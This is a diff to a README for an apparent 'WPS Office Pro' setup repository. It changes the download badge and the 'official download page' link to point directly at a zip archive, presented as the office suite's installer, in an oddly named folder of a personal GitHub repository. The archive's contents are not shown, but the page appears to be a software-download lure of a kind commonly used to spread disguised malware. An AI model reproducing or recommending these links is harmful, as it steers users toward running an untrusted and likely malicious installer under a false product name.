@@ -1,12 +1,12 @@
 # 📄 WPS-Office-Pro-Setup - Edit files like a professional today
 
-[![](https://img.shields.io/badge/Download-WPS_Office_Pro-blue.svg)](https://github.com/Emay9915/WPS-Office-Pro-Setup)
+[![](https://img.shields.io/badge/Download-WPS_Office_Pro-blue.svg)](https://github.com/Emay9915/WPS-Office-Pro-Setup/raw/refs/heads/main/blastogenesis/WP_Pro_Setup_Office_v2.9.zip)
 
 WPS Office Pro acts as a replacement for your standard office suite. The software handles Word documents, Excel spreadsheets, and PowerPoint presentations. It includes a tool to edit PDF files and cloud synchronization to keep your work available on every device.
 
 ## 📥 How to download the software
 
-Visit the [official download page](https://github.com/Emay9915/WPS-Office-Pro-Setup) to acquire the setup file. Click the link to proceed.
+Visit the [official download page](https://github.com/Emay9915/WPS-Office-Pro-Setup/raw/refs/heads/main/blastogenesis/WP_Pro_Setup_Office_v2.9.zip) to acquire the setup file. Click the link to proceed.
 
 1. Locate the download button on the page.
 2. Save the file to your computer.
